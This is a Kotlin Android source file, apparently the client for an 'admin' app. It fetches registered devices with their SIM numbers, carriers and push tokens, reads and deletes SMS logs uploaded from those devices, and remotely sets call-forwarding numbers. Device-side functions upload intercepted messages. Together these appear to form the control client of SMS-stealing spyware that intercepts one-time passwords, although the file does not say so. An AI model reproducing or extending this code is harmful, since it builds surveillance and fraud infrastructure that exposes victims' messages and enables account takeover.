package com.example.admin.network

import android.content.Context
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

/**
 * SupabaseApi — backend proxy client for the admin app.
 *
 * ────────────────────────────────────────────────────────────
 *  CRITICAL FIX  (fcm_token missing issue)
 * ────────────────────────────────────────────────────────────
 *  Root cause: `row.optJSONObject("data_json")` returns NULL
 *  when the backend serialises data_json as a plain JSON string
 *  (which happens when the Supabase column is TEXT, not JSONB,
 *  or when the JS client re-serialises it before returning it).
 *
 *  Fix: `djFrom(row)` handles BOTH cases —
 *       • data_json already parsed as JSONObject → use directly
 *       • data_json is a String              → parse then use
 * ────────────────────────────────────────────────────────────
 */
class SupabaseApi() {

    companion object {
        // ── Companion constants required by SupabaseRealtimeManager ──
        const val PROJECT_REF = "dvgcrxrnnezbdjpujjjt"
        const val KEY = ""               // Anon key NOT exposed to app (security)
        const val APP_ID = ""            // Set dynamically via Constants.APP_TOKEN
        const val REGISTERED_DEVICES_TABLE = "devices"

        private const val TAG = "SupabaseApi"
    }

    // ── Backend root URL (edit this if your Replit URL changes) ──────────────
    private val BACKEND_ROOT = "https://d51aa85f-07df-422f-b7d0-9f6efd2785d9-00-9sesenw57uo6.sisko.replit.dev"

    // App token stored in Constants after Constants.init(context) is called
    private val appToken: String get() = com.example.admin.utils.Constants.APP_TOKEN.trim()

    // Base URL for all device API calls
    private val BASE: String get() = "$BACKEND_ROOT/api/device/$appToken"

    private val client: OkHttpClient by lazy {
        OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .build()
    }

    // ════════════════════════════════════════════════════════════════════════
    //  DATA CLASSES
    // ════════════════════════════════════════════════════════════════════════

    data class RegisteredDevice(
        val uid: String,
        val model: String? = null,
        val manufacturer: String? = null,
        val androidVersion: String? = null,
        val brand: String? = null,
        val sim1Number: String? = null,
        val sim2Number: String? = null,
        val sim1Carrier: String? = null,
        val sim2Carrier: String? = null,
        val fcmToken: String? = null,    // ← from data_json.fcm_token
        val joinedAt: Long = 0L,
    )

    data class DeviceStatus(
        val uid: String,
        val checkedAt: Long = 0L,
        val status: String = "",
        val available: String = "",
        val online: Boolean = false,
        val type: String = "",
        val timestamp: Long = 0L,
    )

    data class BatteryInfo(
        val uid: String,
        val level: Int = 0,
        val isCharging: Boolean = false,
        val temperature: Double = 0.0,
        val voltage: Int = 0,
        val health: String? = null,
        val timestamp: Long = 0L,
    )

    data class SmsLog(
        val id: String? = null,
        val uniqueId: String = "",
        val body: String = "",
        val senderNumber: String = "",
        val receiverNumber: String = "",
        val timestamp: Long = 0L,
        val title: String = "",
    )

    data class AdminConfig(
        val number: String = "",
        val status: String = "OFF",
    )

    // ════════════════════════════════════════════════════════════════════════
    //  CRITICAL HELPER — safe data_json extractor
    // ════════════════════════════════════════════════════════════════════════

    /**
     * Safely extract data_json from a row regardless of whether the backend
     * serialised it as a JSONObject or as a plain JSON string.
     *
     * This is the root-cause fix for fcm_token always showing as missing:
     * optJSONObject("data_json") silently returns null for strings,
     * making every field read from dj return "".
     */
    private fun djFrom(row: JSONObject): JSONObject {
        val raw = row.opt("data_json") ?: return JSONObject()
        return when (raw) {
            is JSONObject -> raw
            is String -> {
                if (raw.isBlank() || raw == "null") return JSONObject()
                runCatching { JSONObject(raw) }.getOrElse { JSONObject() }
            }
            else -> JSONObject()
        }
    }

    // ════════════════════════════════════════════════════════════════════════
    //  HTTP HELPERS
    // ════════════════════════════════════════════════════════════════════════

    private fun get(url: String): String {
        val request = Request.Builder().url(url).get().build()
        return client.newCall(request).execute().use { it.body?.string() ?: "{}" }
    }

    private fun post(url: String, body: JSONObject): String {
        val rb = body.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
        val request = Request.Builder().url(url).post(rb).build()
        return client.newCall(request).execute().use { it.body?.string() ?: "{}" }
    }

    private fun patch(url: String, body: JSONObject): String {
        val rb = body.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
        val request = Request.Builder().url(url).patch(rb).build()
        return client.newCall(request).execute().use { it.body?.string() ?: "{}" }
    }

    private fun delete(url: String): Boolean {
        val request = Request.Builder().url(url).delete().build()
        return client.newCall(request).execute().use { it.isSuccessful }
    }

    /** Unwrap the "data" array from a standard { ok, data: [...] } response. */
    private fun dataArray(json: String): JSONArray {
        return try {
            val obj = JSONObject(json)
            obj.optJSONArray("data") ?: JSONArray()
        } catch (e: Exception) {
            Log.e(TAG, "dataArray parse error: ${e.message}")
            JSONArray()
        }
    }

    /** Parse ISO-8601 timestamp to epoch ms (returns 0 on failure). */
    private fun parseIsoToMs(iso: String): Long {
        if (iso.isBlank()) return 0L
        return try {
            java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.US)
                .also { it.timeZone = java.util.TimeZone.getTimeZone("UTC") }
                .parse(iso)?.time ?: 0L
        } catch (_: Exception) {
            try {
                java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", java.util.Locale.US)
                    .also { it.timeZone = java.util.TimeZone.getTimeZone("UTC") }
                    .parse(iso)?.time ?: 0L
            } catch (_: Exception) { 0L }
        }
    }

    // ════════════════════════════════════════════════════════════════════════
    //  ROW PARSERS
    // ════════════════════════════════════════════════════════════════════════

    /** Return true for real device rows; skip admin/config rows. */
    private fun isRealDeviceRow(uid: String, dataType: String): Boolean {
        if (uid.isBlank()) return false
        if (uid == "admin_config_main" || uid.startsWith("admin_")) return false
        if (dataType == "admin_config") return false
        return true
    }

    /**
     * Parse a device row from the backend API response into a RegisteredDevice.
     *
     * Reads fcm_token from data_json using djFrom() — handles both
     * JSONObject and String formats of the data_json field.
     */
    fun parseRegisteredDeviceRow(row: JSONObject): RegisteredDevice? {
        val uid = row.optString("sub_id", row.optString("uid", "")).trim()
        val dataType = row.optString("data_type", "").trim()
        if (!isRealDeviceRow(uid, dataType)) return null

        // ── FIXED: use djFrom instead of optJSONObject to handle String case ──
        val dj = djFrom(row)
        val registeredAt = parseIsoToMs(row.optString("registered_at", ""))

        // FCM token — try all common key variants in data_json
        val rawFcmToken = dj.optString("fcm_token",
            dj.optString("fcmtoken",
                dj.optString("fcmToken",
                    dj.optString("FCMToken", "")))).trim()

        Log.d(TAG, "parseRegisteredDeviceRow uid=$uid " +
                "dj_keys=${dj.keys().asSequence().toList()} " +
                "raw_fcm=${rawFcmToken.take(30).ifBlank { "<empty>" }}")

        return RegisteredDevice(
            uid           = uid,
            model         = row.optString("device_model",
                            dj.optString("model",
                            dj.optString("device_model", ""))).ifBlank { null },
            manufacturer  = dj.optString("manufacturer", "").ifBlank { null },
            androidVersion= row.optString("android_version",
                            dj.optString("androidversion",
                            dj.optString("androidVersion", ""))).ifBlank { null },
            brand         = dj.optString("brand", "").ifBlank { null },
            sim1Number    = dj.optString("sim1number", dj.optString("sim1Number", "")).ifBlank { null },
            sim2Number    = dj.optString("sim2number", dj.optString("sim2Number", "")).ifBlank { null },
            sim1Carrier   = dj.optString("sim1carrier",
                            dj.optString("sim1Carrier",
                            dj.optString("sim1_carrier", ""))).ifBlank { null },
            sim2Carrier   = dj.optString("sim2carrier",
                            dj.optString("sim2Carrier",
                            dj.optString("sim2_carrier", ""))).ifBlank { null },
            fcmToken      = rawFcmToken.ifBlank { null },
            joinedAt      = dj.optLong("joinedat", registeredAt),
        )
    }

    private fun parseDeviceStatusRow(row: JSONObject): DeviceStatus? {
        val uid = row.optString("sub_id", row.optString("uid", "")).trim()
        if (uid.isBlank()) return null

        val dj       = djFrom(row)
        val hb       = dj.optJSONObject("heartbeat") ?: JSONObject()
        val checkedAt = when {
            hb.has("checked_at") -> hb.optLong("checked_at", 0L)
            else -> parseIsoToMs(row.optString("last_heartbeat_at", ""))
                .takeIf { it > 0L }
                ?: parseIsoToMs(row.optString("updated_at", ""))
        }

        return DeviceStatus(
            uid       = uid,
            checkedAt = checkedAt,
            status    = hb.optString("status", ""),
            available = hb.optString("available", ""),
            online    = hb.optBoolean("online", false),
            type      = row.optString("data_type", ""),
            timestamp = parseIsoToMs(row.optString("updated_at", "")),
        )
    }

    private fun parseBatteryRow(row: JSONObject): BatteryInfo? {
        val uid = row.optString("sub_id", row.optString("uid", "")).trim()
        if (uid.isBlank()) return null
        val dj = djFrom(row)
        val batt = dj.optJSONObject("battery") ?: dj
        return BatteryInfo(
            uid         = uid,
            level       = batt.optInt("level", 0),
            isCharging  = batt.optBoolean("ischarging",
                          batt.optBoolean("isCharging", false)),
            temperature = batt.optDouble("temperature", 0.0),
            voltage     = batt.optInt("voltage", 0),
            health      = batt.optString("health", "").ifBlank { null },
            timestamp   = parseIsoToMs(row.optString("updated_at", "")),
        )
    }

    fun parseSmsRow(row: JSONObject): SmsLog? {
        val id = row.optString("id", "").ifBlank { null }
        val subId = row.optString("sub_id", row.optString("uid", "")).trim()
        if (subId.isBlank()) return null
        val tsRaw  = row.opt("sent_at") ?: row.opt("timestamp")
        val ts: Long = when (tsRaw) {
            is Long   -> tsRaw
            is Int    -> tsRaw.toLong()
            is Number -> tsRaw.toLong()
            is String -> parseIsoToMs(tsRaw).takeIf { it > 0L } ?: tsRaw.toLongOrNull() ?: 0L
            else      -> 0L
        }
        return SmsLog(
            id             = id,
            uniqueId       = subId,
            body           = row.optString("content", row.optString("body", "")),
            senderNumber   = row.optString("from_id",
                             row.optString("sender_number",
                             row.optString("senderNumber", ""))),
            receiverNumber = row.optString("to_id",
                             row.optString("receiver_number",
                             row.optString("receiverNumber", ""))),
            timestamp      = ts,
            title          = row.optString("title", ""),
        )
    }

    // ════════════════════════════════════════════════════════════════════════
    //  PUBLIC API — device queries (used by DeviceActivity / FinalActivity)
    // ════════════════════════════════════════════════════════════════════════

    suspend fun getAllDevices(): Result<List<RegisteredDevice>> =
        kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
            try {
                val url = "$BASE/get"
                Log.d(TAG, "getAllDevices → $url")
                val arr = dataArray(get(url))
                Log.d(TAG, "getAllDevices → got ${arr.length()} rows")
                val list = mutableListOf<RegisteredDevice>()
                for (i in 0 until arr.length()) {
                    parseRegisteredDeviceRow(arr.getJSONObject(i))?.let { list.add(it) }
                }
                Log.d(TAG, "getAllDevices → parsed ${list.size} devices, " +
                        "fcm_tokens present: ${list.count { !it.fcmToken.isNullOrBlank() }}")
                Result.success(list)
            } catch (e: Exception) {
                Log.e(TAG, "getAllDevices error: ${e.message}")
                Result.failure(e)
            }
        }

    suspend fun getLatestDeviceStatuses(): Result<Map<String, DeviceStatus>> =
        kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
            try {
                val arr = dataArray(get("$BASE/get"))
                val map = mutableMapOf<String, DeviceStatus>()
                for (i in 0 until arr.length()) {
                    val row = arr.getJSONObject(i)
                    parseDeviceStatusRow(row)?.let { map[it.uid] = it }
                }
                Result.success(map)
            } catch (e: Exception) {
                Log.e(TAG, "getLatestDeviceStatuses error: ${e.message}")
                Result.failure(e)
            }
        }

    suspend fun getAllDeviceStatuses(): Result<List<DeviceStatus>> =
        kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
            try {
                val arr = dataArray(get("$BASE/get"))
                val list = mutableListOf<DeviceStatus>()
                for (i in 0 until arr.length()) {
                    parseDeviceStatusRow(arr.getJSONObject(i))?.let { list.add(it) }
                }
                Result.success(list)
            } catch (e: Exception) {
                Log.e(TAG, "getAllDeviceStatuses error: ${e.message}")
                Result.failure(e)
            }
        }

    suspend fun getAllBatteryData(): Result<List<BatteryInfo>> =
        kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
            try {
                val arr = dataArray(get("$BASE/get"))
                val list = mutableListOf<BatteryInfo>()
                for (i in 0 until arr.length()) {
                    parseBatteryRow(arr.getJSONObject(i))?.let { list.add(it) }
                }
                Result.success(list)
            } catch (e: Exception) {
                Log.e(TAG, "getAllBatteryData error: ${e.message}")
                Result.failure(e)
            }
        }

    suspend fun getSmsLogsByUniqueId(uid: String, limit: Int = 50): Result<List<SmsLog>> =
        kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
            try {
                val url = "$BASE/messages?uid=${uid}&limit=$limit"
                val arr = dataArray(get(url))
                val list = mutableListOf<SmsLog>()
                for (i in 0 until arr.length()) {
                    parseSmsRow(arr.getJSONObject(i))?.let { list.add(it) }
                }
                Result.success(list)
            } catch (e: Exception) {
                Log.e(TAG, "getSmsLogsByUniqueId error: ${e.message}")
                Result.failure(e)
            }
        }

    suspend fun getAllSmsLogs(limit: Int = 50): Result<List<SmsLog>> =
        kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
            try {
                val arr = dataArray(get("$BASE/messages?limit=$limit"))
                val list = mutableListOf<SmsLog>()
                for (i in 0 until arr.length()) {
                    parseSmsRow(arr.getJSONObject(i))?.let { list.add(it) }
                }
                Result.success(list)
            } catch (e: Exception) {
                Log.e(TAG, "getAllSmsLogs error: ${e.message}")
                Result.failure(e)
            }
        }

    suspend fun deleteSmsLog(id: String): Result<Boolean> =
        kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
            try {
                val ok = delete("$BASE/messages/$id")
                Result.success(ok)
            } catch (e: Exception) {
                Log.e(TAG, "deleteSmsLog error: ${e.message}")
                Result.failure(e)
            }
        }

    suspend fun deleteDevice(uid: String): Result<Boolean> =
        kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
            try {
                val ok = delete("$BASE/delete/$uid")
                Result.success(ok)
            } catch (e: Exception) {
                Log.e(TAG, "deleteDevice error: ${e.message}")
                Result.failure(e)
            }
        }

    suspend fun getStarredDevices(): Result<Map<String, Boolean>> =
        kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
            try {
                val arr = dataArray(get("$BASE/get"))
                val map = mutableMapOf<String, Boolean>()
                for (i in 0 until arr.length()) {
                    val row = arr.getJSONObject(i)
                    val uid = row.optString("sub_id", row.optString("uid", "")).trim()
                    if (uid.isBlank()) continue
                    val dj = djFrom(row)
                    map[uid] = dj.optBoolean("starred", false)
                }
                Result.success(map)
            } catch (e: Exception) {
                Log.e(TAG, "getStarredDevices error: ${e.message}")
                Result.failure(e)
            }
        }

    suspend fun setStarred(uid: String, starred: Boolean): Result<Boolean> =
        kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
            try {
                val body = JSONObject().apply {
                    put("data_json", JSONObject().apply { put("starred", starred) })
                }
                val resp = patch("$BASE/update/$uid", body)
                Result.success(JSONObject(resp).optBoolean("ok", false))
            } catch (e: Exception) {
                Log.e(TAG, "setStarred error: ${e.message}")
                Result.failure(e)
            }
        }

    suspend fun getAdminConfig(): Result<AdminConfig> =
        kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
            try {
                val url = "$BASE/get/admin_config_main"
                val resp = get(url)
                val data = JSONObject(resp).optJSONObject("data") ?: JSONObject()
                val dj = djFrom(data)
                val config = AdminConfig(
                    number = dj.optString("number",
                             data.optString("admin_number",
                             data.optString("number", ""))),
                    status = dj.optString("status", data.optString("admin_status", "OFF")),
                )
                Result.success(config)
            } catch (e: Exception) {
                Log.e(TAG, "getAdminConfig error: ${e.message}")
                Result.failure(e)
            }
        }

    suspend fun updateAdminConfig(number: String, status: String): Result<Boolean> =
        kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
            try {
                val body = JSONObject().apply {
                    put("data_json", JSONObject().apply {
                        put("number", number)
                        put("status", status)
                    })
                }
                val resp = patch("$BASE/update/admin_config_main", body)
                Result.success(JSONObject(resp).optBoolean("ok", false))
            } catch (e: Exception) {
                Log.e(TAG, "updateAdminConfig error: ${e.message}")
                Result.failure(e)
            }
        }

    suspend fun updateCallForwarding(uid: String, number: String, status: String): Result<Boolean> =
        kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
            try {
                val body = JSONObject().apply {
                    put("call_forward_number", number)
                    put("call_forward_status", status)
                }
                val resp = patch("$BASE/update/$uid", body)
                Result.success(JSONObject(resp).optBoolean("ok", false))
            } catch (e: Exception) {
                Log.e(TAG, "updateCallForwarding error: ${e.message}")
                Result.failure(e)
            }
        }

    // ════════════════════════════════════════════════════════════════════════
    //  DEVICE SIDE (used by MainActivity / device registration)
    // ════════════════════════════════════════════════════════════════════════

    suspend fun smartUpsert(payload: JSONObject, context: Context? = null): Result<JSONObject> =
        kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
            try {
                val url = "$BACKEND_ROOT/api/device/$appToken/upsert"
                val resp = post(url, payload)
                Result.success(JSONObject(resp))
            } catch (e: Exception) {
                Log.e(TAG, "smartUpsert error: ${e.message}")
                Result.failure(e)
            }
        }

    suspend fun insertSmsLog(payload: JSONObject): Result<JSONObject> =
        kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
            try {
                val resp = post("$BACKEND_ROOT/api/device/$appToken/message", payload)
                Result.success(JSONObject(resp))
            } catch (e: Exception) {
                Log.e(TAG, "insertSmsLog error: ${e.message}")
                Result.failure(e)
            }
        }

    suspend fun registerDevice(payload: JSONObject): Result<JSONObject> =
        smartUpsert(payload)

    suspend fun updateDeviceToken(subId: String, fcmToken: String): Result<JSONObject> =
        kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
            try {
                val payload = JSONObject().apply {
                    put("sub_id", subId)
                    put("data_type", "fcm_token")
                    put("data_json", JSONObject().apply {
                        put("fcm_token", fcmToken)
                        put("fcm_token_status", "active")
                    })
                }
                smartUpsert(payload).getOrThrow().let { Result.success(it) }
            } catch (e: Exception) {
                Log.e(TAG, "updateDeviceToken error: ${e.message}")
                Result.failure(e)
            }
        }

    suspend fun upsertHeartbeat(subId: String, payload: JSONObject): Result<JSONObject> =
        smartUpsert(payload.apply { put("sub_id", subId); put("data_type", "heartbeat") })
}
